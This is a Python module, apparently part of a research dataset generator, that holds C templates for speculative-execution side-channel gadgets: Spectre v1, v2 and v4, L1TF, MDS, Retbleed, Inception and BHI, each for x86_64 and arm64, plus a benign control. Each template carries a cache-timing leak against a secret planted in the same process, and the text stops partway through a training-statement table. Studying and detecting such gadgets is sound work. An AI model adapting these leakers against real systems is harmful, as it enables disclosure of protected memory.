# gen/synth/templates.py
#
# One C gadget template per (vuln_class, arch), keyed in TEMPLATES. Every
# template is a complete, runnable, speculatively-leaking gadget: it
# #include-s the harness (utils.c for x86_64, utils_arm64.c for arm64,
# both defining probe_array / CACHE_LINE_SIZE / perform_measurement /
# flush_probe_array / common_init), plants a secret, transiently transmits
# a speculatively-read value via `probe_array[value * CACHE_LINE_SIZE] = 1`,
# and calls `perform_measurement(secret, name)`.
#
# Distilled 1:1 from the repo's canonical PoCs in c_vulns/c_code/:
#   SPECTRE_V1 <- spectre_1.c / spectre_1_arm64.c
#   SPECTRE_V2 <- spectre_2.c / spectre_2_arm64.c
#   L1TF       <- l1tf.c / l1tf_arm64.c
#   MDS        <- mds.c / mds_arm64.c
#   BHI        <- bhi.c / bhi_arm64.c
#   INCEPTION  <- inception.c / inception_arm64.c
#   RETBLEED   <- retbleed.c / retbleed_arm64.c
# Authored fresh (no canonical PoC existed for these):
#   BENIGN     <- negative control shape (harness exercised, never leaks)
#   SPECTRE_V4 <- speculative store bypass (store then aliased dependent load)
#
# Knob placeholders (str.format): {secret}, {train_iters}, {pad},
# {reorder_a}, {reorder_b}, {gen_body}. All other literal C braces are
# doubled ({{ }}) to survive str.format. Stride is locked to CACHE_LINE_SIZE
# (never a knob) because perform_measurement scans the probe array at that
# stride. {gen_body} is the transmit-body splice point for every class
# except BENIGN (which has none, by design -- it never transmits the
# secret); see _DEFAULT_GEN_BODY / render()'s gen_body parameter.
from __future__ import annotations
from gen.synth.params import GadgetParams

SPEC_WINDOW_MARK = "/*SPEC_WINDOW*/"

# --------------------------------------------------------------------------
# SPECTRE_V1 -- distilled from spectre_1.c / spectre_1_arm64.c
# --------------------------------------------------------------------------

_V1_X86 = r'''
#include "utils.c"
// Synthesized SPECTRE_V1 gadget (bounds-check bypass). Complete leaker.
uint8_t public_array_v1[16] = {{1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}};
uint8_t secret_v1 = {secret};
uint8_t *g_arr = public_array_v1;
size_t   g_sz  = sizeof(public_array_v1);

__attribute__((noinline)) void spec_read(size_t index) {{
    if (index < g_sz) {{
        /*SPEC_WINDOW*/
        __asm__ __volatile__({pad} ::: "memory");
        {gen_body}
    }}
}}

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    size_t oob = (size_t)(&secret_v1 - g_arr);
    spec_read(oob);
    _mm_lfence();
    perform_measurement(secret_v1, "SPECTRE_V1 secret");
    printf("Actual secret data: %c\n", secret_v1);
    return 0;
}}
'''

_V1_ARM64 = r'''
#include "utils_arm64.c"
// Synthesized SPECTRE_V1 gadget (bounds-check bypass), ARM64. Complete leaker.
uint8_t public_array_v1[16] = {{1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}};
uint8_t secret_v1 = {secret};
uint8_t *g_arr = public_array_v1;
size_t   g_sz  = sizeof(public_array_v1);

__attribute__((noinline)) void spec_read(size_t index) {{
    if (index < g_sz) {{
        /*SPEC_WINDOW*/
        __asm__ __volatile__({pad} ::: "memory");
        {gen_body}
    }}
}}

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    size_t oob = (size_t)(&secret_v1 - g_arr);
    spec_read(oob);
    _mm_lfence();
    perform_measurement(secret_v1, "SPECTRE_V1 secret");
    printf("Actual secret data: %c\n", secret_v1);
    return 0;
}}
'''

# --------------------------------------------------------------------------
# SPECTRE_V2 -- distilled from spectre_2.c / spectre_2_arm64.c (BTB poisoning)
# --------------------------------------------------------------------------

_V2_X86 = r'''
#include "utils.c"
// Synthesized SPECTRE_V2 gadget (Branch Target Injection / BTB poisoning).
// Distilled from spectre_2.c.
typedef void (*indirect_func_ptr_t)(uint8_t);
uint8_t secret_value_v2 = {secret};

__attribute__((noinline)) void speculative_gadget_v2(uint8_t value_to_leak) {{
    {gen_body}
}}

__attribute__((noinline)) void architectural_target_v2(uint8_t val) {{
    printf("Architectural execution reached benign target with value %d.\n", val);
}}

__attribute__((noinline)) void spectre_v2_train_step(void) {{
    indirect_func_ptr_t train_ptr = speculative_gadget_v2;
    __asm__ __volatile__(
        "callq *%0\n\t"
        "mfence\n\t"
        "lfence\n\t"
        : : "r"(train_ptr) : "memory");
}}

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    /*SPEC_WINDOW*/
    __asm__ __volatile__({pad} ::: "memory");
    indirect_func_ptr_t victim_ptr = architectural_target_v2;
    victim_ptr(secret_value_v2);
    _mm_lfence();
    perform_measurement(secret_value_v2, "SPECTRE_V2 secret");
    printf("Actual secret data: %c\n", secret_value_v2);
    return 0;
}}
'''

_V2_ARM64 = r'''
#include "utils_arm64.c"
// Synthesized SPECTRE_V2 gadget (Branch Target Injection / BTB poisoning),
// ARM64. Distilled from spectre_2_arm64.c.
typedef void (*indirect_func_ptr_t)(uint8_t);
uint8_t secret_value_v2 = {secret};

__attribute__((noinline)) void speculative_gadget_v2(uint8_t value_to_leak) {{
    {gen_body}
}}

__attribute__((noinline)) void architectural_target_v2(uint8_t val) {{
    printf("Architectural execution reached benign target with value %d.\n", val);
}}

__attribute__((noinline)) void spectre_v2_train_step(void) {{
    indirect_func_ptr_t train_ptr = speculative_gadget_v2;
    __asm__ __volatile__(
        "blr %0\n\t"
        "dsb sy\n\t"
        "dsb ld\n\t"
        : : "r"(train_ptr) : "x30", "memory");
}}

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    /*SPEC_WINDOW*/
    __asm__ __volatile__({pad} ::: "memory");
    indirect_func_ptr_t victim_ptr = architectural_target_v2;
    victim_ptr(secret_value_v2);
    _mm_lfence();
    perform_measurement(secret_value_v2, "SPECTRE_V2 secret");
    printf("Actual secret data: %c\n", secret_value_v2);
    return 0;
}}
'''

# --------------------------------------------------------------------------
# SPECTRE_V4 -- fresh design (no canonical PoC): speculative store bypass.
# A store whose address was just clflush'd is slow to retire; a dependent
# load through an aliased pointer speculatively reads the stale (secret)
# value at that memory location before the store commits.
# --------------------------------------------------------------------------

_V4_X86 = r'''
#include "utils.c"
// Synthesized SPECTRE_V4 gadget (Speculative Store Bypass). Fresh design
// (no canonical PoC in c_vulns/c_code/): one slot holds the secret. It is
// clflush'd, then a slow store of a PUBLIC value targets that SAME slot;
// immediately after, a load from that same address may bypass the
// not-yet-retired store (the CPU's memory disambiguator speculates the
// load does not alias the pending store) and forward the stale value that
// was resident before the flush -- the secret.
uint8_t secret_v4 = {secret};
uint8_t ssb_slot_v4 = 0;
uint8_t *ssb_ptr_v4 = &ssb_slot_v4;
uint8_t public_store_val_v4 = 0;

__attribute__((noinline)) void ssb_train_step(void) {{
    // Train the store-to-load path on a non-aliasing pair so the
    // disambiguator is biased toward "no alias" before the real,
    // aliasing store+load in ssb_gadget() below.
    uint8_t tmp_v4 = 0;
    uint8_t *tmp_ptr_v4 = &tmp_v4;
    *tmp_ptr_v4 = 0;
    volatile uint8_t v = *tmp_ptr_v4;
    (void)v;
}}

__attribute__((noinline)) void ssb_gadget(void) {{
    ssb_slot_v4 = secret_v4;
    _mm_clflush(ssb_ptr_v4);
    _mm_mfence();
    *ssb_ptr_v4 = public_store_val_v4;
    /*SPEC_WINDOW*/
    __asm__ __volatile__({pad} ::: "memory");
    {gen_body}
}}

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    ssb_gadget();
    _mm_lfence();
    perform_measurement(secret_v4, "SPECTRE_V4 secret");
    printf("Actual secret data: %c\n", secret_v4);
    return 0;
}}
'''

_V4_ARM64 = r'''
#include "utils_arm64.c"
// Synthesized SPECTRE_V4 gadget (Speculative Store Bypass), ARM64. Fresh
// design; utils_arm64.c provides _mm_clflush/_mm_mfence/_mm_lfence under
// the same names (dc civac / dsb ish), so the body is arch-agnostic. One
// slot holds the secret. It is clflush'd, then a slow store of a PUBLIC
// value targets that SAME slot; immediately after, a load from that same
// address may bypass the not-yet-retired store (the CPU's memory
// disambiguator speculates the load does not alias the pending store) and
// forward the stale value that was resident before the flush -- the secret.
uint8_t secret_v4 = {secret};
uint8_t ssb_slot_v4 = 0;
uint8_t *ssb_ptr_v4 = &ssb_slot_v4;
uint8_t public_store_val_v4 = 0;

__attribute__((noinline)) void ssb_train_step(void) {{
    // Train the store-to-load path on a non-aliasing pair so the
    // disambiguator is biased toward "no alias" before the real,
    // aliasing store+load in ssb_gadget() below.
    uint8_t tmp_v4 = 0;
    uint8_t *tmp_ptr_v4 = &tmp_v4;
    *tmp_ptr_v4 = 0;
    volatile uint8_t v = *tmp_ptr_v4;
    (void)v;
}}

__attribute__((noinline)) void ssb_gadget(void) {{
    ssb_slot_v4 = secret_v4;
    _mm_clflush(ssb_ptr_v4);
    _mm_mfence();
    *ssb_ptr_v4 = public_store_val_v4;
    /*SPEC_WINDOW*/
    __asm__ __volatile__({pad} ::: "memory");
    {gen_body}
}}

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    ssb_gadget();
    _mm_lfence();
    perform_measurement(secret_v4, "SPECTRE_V4 secret");
    printf("Actual secret data: %c\n", secret_v4);
    return 0;
}}
'''

# --------------------------------------------------------------------------
# L1TF -- distilled from l1tf.c / l1tf_arm64.c (Foreshadow-style)
# --------------------------------------------------------------------------

_L1TF_X86 = r'''
#include "utils.c"
// Synthesized L1TF gadget (Foreshadow-style transient read of an unmapped
// but still-cached page). Distilled from l1tf.c.
// The transmit below indexes probe_array via a hardcoded "shl $6" (2**6 ==
// CACHE_LINE_SIZE) rather than a C-level "* CACHE_LINE_SIZE" (inline asm
// needs a literal immediate); this assert keeps that immediate honest.
_Static_assert(CACHE_LINE_SIZE == 64, "L1TF asm shift assumes stride 64 (2**6)");
uint8_t secret_l1tf_byte = {secret};
volatile uint8_t *g_l1tf_secret_page = NULL;
static sigjmp_buf jmpbuf_l1tf;

void sigsegv_handler_l1tf(int sig) {{
    // Handler stays installed across all retry attempts (no reset-to-
    // SIG_DFL) since the protected-page read faults on every attempt on
    // hosts where this speculative read is never actually satisfied.
    // Catches both SIGSEGV (typical Linux behavior for a PROT_NONE access)
    // and SIGBUS (observed on this arm64/macOS host for the same access) --
    // registered for both below -- so neither manifests as an uncaught
    // crash.
    siglongjmp(jmpbuf_l1tf, 1);
}}

__attribute__((noinline)) void l1tf_train_step(void) {{
    volatile uint8_t dummy = 0;
    (void)dummy;
}}

int main() {{
    common_init();
    size_t page_size = getpagesize();
    g_l1tf_secret_page = (uint8_t *)mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_l1tf_secret_page == MAP_FAILED) {{ return 1; }}
    *(g_l1tf_secret_page + 0x100) = secret_l1tf_byte;
    if (signal(SIGSEGV, sigsegv_handler_l1tf) == SIG_ERR) {{ return 1; }}
    if (signal(SIGBUS, sigsegv_handler_l1tf) == SIG_ERR) {{ return 1; }}
    if (mprotect((void *)g_l1tf_secret_page, page_size, PROT_NONE) == -1) {{ return 1; }}

    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}

    for (int attempt = 0; attempt < 50; ++attempt) {{
        flush_probe_array();
        if (sigsetjmp(jmpbuf_l1tf, 1) == 0) {{
            /*SPEC_WINDOW*/
            __asm__ __volatile__({pad} ::: "memory");
            {gen_body}
        }} else {{
            _mm_lfence();
        }}
        if (perform_measurement(secret_l1tf_byte, "L1TF secret")) {{
            munmap((void *)g_l1tf_secret_page, page_size);
            return 0;
        }}
    }}
    printf("Actual secret data: %c\n", secret_l1tf_byte);
    munmap((void *)g_l1tf_secret_page, page_size);
    return 0;
}}
'''

_L1TF_ARM64 = r'''
#include "utils_arm64.c"
// Synthesized L1TF gadget (Foreshadow-style transient read of an unmapped
// but still-cached page), ARM64. Distilled from l1tf_arm64.c.
// The transmit below indexes probe_array via a hardcoded "lsl #6" (2**6 ==
// CACHE_LINE_SIZE) rather than a C-level "* CACHE_LINE_SIZE" (inline asm
// needs a literal immediate); this assert keeps that immediate honest.
_Static_assert(CACHE_LINE_SIZE == 64, "L1TF asm shift assumes stride 64 (2**6)");
uint8_t secret_l1tf_byte = {secret};
volatile uint8_t *g_l1tf_secret_page = NULL;
static sigjmp_buf jmpbuf_l1tf;

void sigsegv_handler_l1tf(int sig) {{
    // Handler stays installed across all retry attempts (no reset-to-
    // SIG_DFL) since the protected-page read faults on every attempt on
    // hosts where this speculative read is never actually satisfied.
    // Catches both SIGSEGV (typical Linux behavior for a PROT_NONE access)
    // and SIGBUS (observed on this arm64/macOS host for the same access) --
    // registered for both below -- so neither manifests as an uncaught
    // crash.
    siglongjmp(jmpbuf_l1tf, 1);
}}

__attribute__((noinline)) void l1tf_train_step(void) {{
    volatile uint8_t dummy = 0;
    (void)dummy;
}}

int main() {{
    common_init();
    size_t page_size = getpagesize();
    g_l1tf_secret_page = (uint8_t *)mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_l1tf_secret_page == MAP_FAILED) {{ return 1; }}
    *(g_l1tf_secret_page + 0x100) = secret_l1tf_byte;
    if (signal(SIGSEGV, sigsegv_handler_l1tf) == SIG_ERR) {{ return 1; }}
    if (signal(SIGBUS, sigsegv_handler_l1tf) == SIG_ERR) {{ return 1; }}
    if (mprotect((void *)g_l1tf_secret_page, page_size, PROT_NONE) == -1) {{ return 1; }}

    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}

    for (int attempt = 0; attempt < 50; ++attempt) {{
        flush_probe_array();
        if (sigsetjmp(jmpbuf_l1tf, 1) == 0) {{
            /*SPEC_WINDOW*/
            __asm__ __volatile__({pad} ::: "memory");
            {gen_body}
        }} else {{
            _mm_lfence();
        }}
        if (perform_measurement(secret_l1tf_byte, "L1TF secret")) {{
            munmap((void *)g_l1tf_secret_page, page_size);
            return 0;
        }}
    }}
    printf("Actual secret data: %c\n", secret_l1tf_byte);
    munmap((void *)g_l1tf_secret_page, page_size);
    return 0;
}}
'''

# --------------------------------------------------------------------------
# MDS -- distilled from mds.c / mds_arm64.c (ZombieLoad/RIDL-style)
# --------------------------------------------------------------------------

_MDS_X86 = r'''
#include "utils.c"
// Synthesized MDS gadget (ZombieLoad/RIDL-style forwarding of buffered
// data). Distilled from mds.c.
volatile uint8_t secret_mds_byte = {secret};
uint8_t mds_target_memory[CACHE_LINE_SIZE] __attribute__((aligned(CACHE_LINE_SIZE)));
static sigjmp_buf jmpbuf_mds;

void sigsegv_handler_mds(int sig) {{
    siglongjmp(jmpbuf_mds, 1);
}}

__attribute__((noinline)) void mds_train_step(void) {{
    volatile uint8_t dummy = 0;
    (void)dummy;
}}

int main() {{
    common_init();
    mds_target_memory[0] = secret_mds_byte;
    if (signal(SIGSEGV, sigsegv_handler_mds) == SIG_ERR) {{ return 1; }}

    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}

    for (int attempt = 0; attempt < 50; ++attempt) {{
        flush_probe_array();
        _mm_clflush(mds_target_memory);
        _mm_mfence();
        if (sigsetjmp(jmpbuf_mds, 1) == 0) {{
            /*SPEC_WINDOW*/
            __asm__ __volatile__({pad} ::: "memory");
            {gen_body}
            volatile uint8_t dummy_read = mds_target_memory[0];
            (void)dummy_read;
        }} else {{
            _mm_lfence();
        }}
        if (perform_measurement(secret_mds_byte, "MDS secret")) {{
            return 0;
        }}
    }}
    printf("Actual secret data: %c\n", secret_mds_byte);
    return 0;
}}
'''

_MDS_ARM64 = r'''
#include "utils_arm64.c"
// Synthesized MDS gadget (ZombieLoad/RIDL-style forwarding of buffered
// data), ARM64. Distilled from mds_arm64.c.
volatile uint8_t secret_mds_byte = {secret};
uint8_t mds_target_memory[CACHE_LINE_SIZE] __attribute__((aligned(CACHE_LINE_SIZE)));
static sigjmp_buf jmpbuf_mds;

void sigsegv_handler_mds(int sig) {{
    siglongjmp(jmpbuf_mds, 1);
}}

__attribute__((noinline)) void mds_train_step(void) {{
    volatile uint8_t dummy = 0;
    (void)dummy;
}}

int main() {{
    common_init();
    mds_target_memory[0] = secret_mds_byte;
    if (signal(SIGSEGV, sigsegv_handler_mds) == SIG_ERR) {{ return 1; }}

    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}

    for (int attempt = 0; attempt < 50; ++attempt) {{
        flush_probe_array();
        _mm_clflush(mds_target_memory);
        _mm_mfence();
        if (sigsetjmp(jmpbuf_mds, 1) == 0) {{
            /*SPEC_WINDOW*/
            __asm__ __volatile__({pad} ::: "memory");
            {gen_body}
            volatile uint8_t dummy_read = mds_target_memory[0];
            (void)dummy_read;
        }} else {{
            _mm_lfence();
        }}
        if (perform_measurement(secret_mds_byte, "MDS secret")) {{
            return 0;
        }}
    }}
    printf("Actual secret data: %c\n", secret_mds_byte);
    return 0;
}}
'''

# --------------------------------------------------------------------------
# RETBLEED -- distilled from retbleed.c / retbleed_arm64.c (RSB underflow)
# --------------------------------------------------------------------------

_RETBLEED_X86 = r'''
#include "utils.c"
// Synthesized RETBLEED gadget (RSB underflow / branch type confusion).
// Distilled from retbleed.c. ADJUDICABLE="partial": whether this leaks
// depends on the simulator's RSB/BTB misprediction model for `ret`.
uint8_t secret_retbleed_data = {secret};

__attribute__((noinline)) void leak_gadget_retbleed(uint8_t value) {{
    {gen_body}
}}

__attribute__((noinline)) void deep_call_retbleed(int depth) {{
    if (depth > 0) {{
        deep_call_retbleed(depth - 1);
    }}
}}

__attribute__((noinline)) void retbleed_train_step(void) {{
    void (*p)(uint8_t) = leak_gadget_retbleed;
    p(0);
}}

__attribute__((noinline)) void victim_function_with_return_retbleed(uint8_t value_for_gadget) {{
    // Stage the secret into rdi -- the SysV AMD64 register leak_gadget_retbleed
    // (uint8_t value) actually reads its first argument from -- so that if
    // the CPU misdirects here (see below), leak_gadget_retbleed observes the
    // live secret in the register it expects.
    __asm__ __volatile__(
        "mov %0, %%rdi\n\t"
        : : "r"((uint64_t)value_for_gadget) : "rdi");
    /*SPEC_WINDOW*/
    __asm__ __volatile__({pad} ::: "memory");
    // Implicit 'ret' below is the misdirection target: architecturally
    // returns here, but with the RSB underflowed (see deep_call_retbleed)
    // the CPU may speculatively fetch the BTB/PHT prediction trained onto
    // leak_gadget_retbleed instead, executing it with value_for_gadget live.
}}

int main() {{
    common_init();
    printf("Depleting RSB...\n");
    deep_call_retbleed(64);
    _mm_mfence();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    flush_probe_array();
    _mm_lfence();
    victim_function_with_return_retbleed(secret_retbleed_data);
    _mm_lfence();
    perform_measurement(secret_retbleed_data, "RETBLEED secret");
    printf("Actual secret data: %c\n", secret_retbleed_data);
    return 0;
}}
'''

_RETBLEED_ARM64 = r'''
#include "utils_arm64.c"
// Synthesized RETBLEED gadget (RSB underflow / branch type confusion),
// ARM64. Distilled from retbleed_arm64.c. ADJUDICABLE="partial".
uint8_t secret_retbleed_data = {secret};

__attribute__((noinline)) void leak_gadget_retbleed(uint8_t value) {{
    {gen_body}
}}

__attribute__((noinline)) void deep_call_retbleed(int depth) {{
    if (depth > 0) {{
        deep_call_retbleed(depth - 1);
    }}
}}

__attribute__((noinline)) void retbleed_train_step(void) {{
    void (*p)(uint8_t) = leak_gadget_retbleed;
    p(0);
}}

__attribute__((noinline)) void victim_function_with_return_retbleed(uint8_t value_for_gadget) {{
    // Stage the secret into x0 -- the AAPCS64 register leak_gadget_retbleed
    // (uint8_t value) actually reads its first argument from -- so that if
    // the CPU misdirects here (see below), leak_gadget_retbleed observes the
    // live secret in the register it expects.
    __asm__ __volatile__(
        "mov x0, %0\n\t"
        : : "r"((uint64_t)value_for_gadget) : "x0");
    /*SPEC_WINDOW*/
    __asm__ __volatile__({pad} ::: "memory");
    // Implicit 'ret' below is the misdirection target (see x86 template).
}}

int main() {{
    common_init();
    printf("Depleting RSB...\n");
    deep_call_retbleed(64);
    _mm_mfence();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    flush_probe_array();
    _mm_lfence();
    victim_function_with_return_retbleed(secret_retbleed_data);
    _mm_lfence();
    perform_measurement(secret_retbleed_data, "RETBLEED secret");
    printf("Actual secret data: %c\n", secret_retbleed_data);
    return 0;
}}
'''

# --------------------------------------------------------------------------
# INCEPTION -- distilled from inception.c / inception_arm64.c (SRSO)
# --------------------------------------------------------------------------

_INCEPTION_X86 = r'''
#include "utils.c"
// Synthesized INCEPTION gadget (Speculative Return Stack Overflow / SRSO,
// AMD-style phantom-CALL RAS overflow). Distilled from inception.c.
uint8_t secret_inception_data = {secret};

__attribute__((noinline)) void leak_gadget_inception(uint8_t value) {{
    {gen_body}
}}

__attribute__((noinline)) void victim_function_inception(void) {{
    volatile int dummy = 0;
    for (int i = 0; i < 10; ++i) {{ dummy += i; }}
    (void)dummy;
}}

__attribute__((noinline)) void inception_train_step(void) {{
    __asm__ __volatile__(
        "mov %0, %%r8\n\t"
        "mov %1, %%r9\n\t"
        ".rept 16\n\t"
        "xor %%eax, %%eax\n\t"
        "nop\n\t"
        ".endr\n"
        :
        : "r"(&leak_gadget_inception), "r"((uint64_t)secret_inception_data)
        : "rax", "r8", "r9");
}}

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    /*SPEC_WINDOW*/
    __asm__ __volatile__({pad} ::: "memory");
    __asm__ __volatile__(
        "mov %0, %%r8\n\t"
        "mov %1, %%r9\n\t"
        :
        : "r"(&leak_gadget_inception), "r"((uint64_t)secret_inception_data)
        : "r8", "r9");
    victim_function_inception();
    _mm_lfence();
    perform_measurement(secret_inception_data, "Inception secret");
    printf("Actual secret data: %c\n", secret_inception_data);
    return 0;
}}
'''

_INCEPTION_ARM64 = r'''
#include "utils_arm64.c"
// Synthesized INCEPTION gadget (Speculative Return Stack Overflow / SRSO),
// ARM64. Distilled from inception_arm64.c.
uint8_t secret_inception_data = {secret};

__attribute__((noinline)) void leak_gadget_inception(uint8_t value) {{
    {gen_body}
}}

__attribute__((noinline)) void victim_function_inception(void) {{
    volatile int dummy = 0;
    for (int i = 0; i < 10; ++i) {{ dummy += i; }}
    (void)dummy;
}}

__attribute__((noinline)) void inception_train_step(void) {{
    __asm__ __volatile__(
        "mov x8, %0\n\t"
        "mov x9, %1\n\t"
        ".rept 16\n\t"
        "eor x0, x0, x0\n\t"
        "nop\n\t"
        ".endr\n"
        :
        : "r"(&leak_gadget_inception), "r"((uint64_t)secret_inception_data)
        : "x0", "x8", "x9");
}}

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    /*SPEC_WINDOW*/
    __asm__ __volatile__({pad} ::: "memory");
    __asm__ __volatile__(
        "mov x8, %0\n\t"
        "mov x9, %1\n\t"
        :
        : "r"(&leak_gadget_inception), "r"((uint64_t)secret_inception_data)
        : "x8", "x9");
    victim_function_inception();
    _mm_lfence();
    perform_measurement(secret_inception_data, "Inception secret");
    printf("Actual secret data: %c\n", secret_inception_data);
    return 0;
}}
'''

# --------------------------------------------------------------------------
# BHI -- distilled from bhi.c / bhi_arm64.c (Branch History Injection)
# --------------------------------------------------------------------------

_BHI_X86 = r'''
#include "utils.c"
// Synthesized BHI gadget (Branch History Injection / Spectre-BHB).
// Distilled from bhi.c.
uint8_t secret_bhi_data = {secret};

__attribute__((noinline)) void leak_gadget_bhi(uint8_t value) {{
    {gen_body}
}}

__attribute__((noinline)) void bhi_train_step(int i) {{
    if (i % 2 == 0) {{
        __asm__ __volatile__("jmp .+4");
    }} else {{
        __asm__ __volatile__("nop");
    }}
    void (*p)(uint8_t) = leak_gadget_bhi;
    __asm__ __volatile__("callq *%0" : : "r"(p) : "memory");
    _mm_mfence();
}}

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    /*SPEC_WINDOW*/
    __asm__ __volatile__({pad} ::: "memory");
    void (*victim_branch_ptr)(uint8_t) = (void (*)(uint8_t))benign_target;
    victim_branch_ptr(secret_bhi_data);
    _mm_lfence();
    perform_measurement(secret_bhi_data, "BHI secret");
    printf("Actual secret data: %c\n", secret_bhi_data);
    return 0;
}}
'''

_BHI_ARM64 = r'''
#include "utils_arm64.c"
// Synthesized BHI gadget (Branch History Injection / Spectre-BHB), ARM64.
// Distilled from bhi_arm64.c.
uint8_t secret_bhi_data = {secret};

__attribute__((noinline)) void leak_gadget_bhi(uint8_t value) {{
    {gen_body}
}}

__attribute__((noinline)) void bhi_train_step(int i) {{
    if (i % 2 == 0) {{
        __asm__ __volatile__("b .+4");
    }} else {{
        __asm__ __volatile__("nop");
    }}
    void (*p)(uint8_t) = leak_gadget_bhi;
    __asm__ __volatile__("blr %0" : : "r"(p) : "x30", "memory");
    _mm_mfence();
}}

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    /*SPEC_WINDOW*/
    __asm__ __volatile__({pad} ::: "memory");
    void (*victim_branch_ptr)(uint8_t) = (void (*)(uint8_t))benign_target;
    victim_branch_ptr(secret_bhi_data);
    _mm_lfence();
    perform_measurement(secret_bhi_data, "BHI secret");
    printf("Actual secret data: %c\n", secret_bhi_data);
    return 0;
}}
'''

# --------------------------------------------------------------------------
# BENIGN -- fresh design (negative control): exercises the harness, never
# speculatively transmits the secret.
# --------------------------------------------------------------------------

_BENIGN_X86 = r'''
#include "utils.c"
// Synthesized BENIGN gadget: exercises the harness but never speculatively
// transmits the secret. Must NOT recover the secret (negative control shape).
uint8_t secret_benign = {secret};
uint8_t public_b[16] = {{1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}};

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    // Only ever transmit a PUBLIC, secret-INDEPENDENT value: a fixed index
    // into the public array. Never derive the index (or the transmitted
    // value) from secret_benign -- that is the entire point of the
    // negative control.
    volatile uint8_t v = public_b[3];
    probe_array[v * CACHE_LINE_SIZE] = 1;
    /*SPEC_WINDOW*/
    __asm__ __volatile__({pad} ::: "memory");
    _mm_lfence();
    perform_measurement(secret_benign, "BENIGN secret");
    printf("Actual secret data: %c\n", secret_benign);
    return 0;
}}
'''

_BENIGN_ARM64 = r'''
#include "utils_arm64.c"
// Synthesized BENIGN gadget, ARM64: exercises the harness but never
// speculatively transmits the secret. Must NOT recover the secret.
uint8_t secret_benign = {secret};
uint8_t public_b[16] = {{1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}};

int main() {{
    common_init();
    for (int i = 0; i < {train_iters}; i++) {{
        {reorder_a}
        {reorder_b}
    }}
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();
    // Only ever transmit a PUBLIC, secret-INDEPENDENT value: a fixed index
    // into the public array. Never derive the index (or the transmitted
    // value) from secret_benign -- that is the entire point of the
    // negative control.
    volatile uint8_t v = public_b[3];
    probe_array[v * CACHE_LINE_SIZE] = 1;
    /*SPEC_WINDOW*/
    __asm__ __volatile__({pad} ::: "memory");
    _mm_lfence();
    perform_measurement(secret_benign, "BENIGN secret");
    printf("Actual secret data: %c\n", secret_benign);
    return 0;
}}
'''

# --------------------------------------------------------------------------
# (class, arch) -> template
# --------------------------------------------------------------------------

TEMPLATES = {
    ("SPECTRE_V1", "x86_64"): _V1_X86,
    ("SPECTRE_V1", "arm64"):  _V1_ARM64,
    ("SPECTRE_V2", "x86_64"): _V2_X86,
    ("SPECTRE_V2", "arm64"):  _V2_ARM64,
    ("SPECTRE_V4", "x86_64"): _V4_X86,
    ("SPECTRE_V4", "arm64"):  _V4_ARM64,
    ("L1TF", "x86_64"):       _L1TF_X86,
    ("L1TF", "arm64"):        _L1TF_ARM64,
    ("MDS", "x86_64"):        _MDS_X86,
    ("MDS", "arm64"):         _MDS_ARM64,
    ("RETBLEED", "x86_64"):   _RETBLEED_X86,
    ("RETBLEED", "arm64"):    _RETBLEED_ARM64,
    ("INCEPTION", "x86_64"):  _INCEPTION_X86,
    ("INCEPTION", "arm64"):   _INCEPTION_ARM64,
    ("BHI", "x86_64"):        _BHI_X86,
    ("BHI", "arm64"):         _BHI_ARM64,
    ("BENIGN", "x86_64"):     _BENIGN_X86,
    ("BENIGN", "arm64"):      _BENIGN_ARM64,
}

# Per-class pair of independent, order-swappable training statements used as
# {reorder_a}/{reorder_b} inside each template's `for (i = 0; i < train_iters;
# i++)` loop. Same pair is used for both arches of a class since the helper
# function name is identical across each class's x86_64/arm64 template pair
# (only the function body's internal asm differs). This is the one place
# per-class knowledge lives -- render() itself stays a single dispatcher.
_REORDER = {
    "SPECTRE_V1": ("spec_read(i % g_sz);", "_mm_lfence();"),
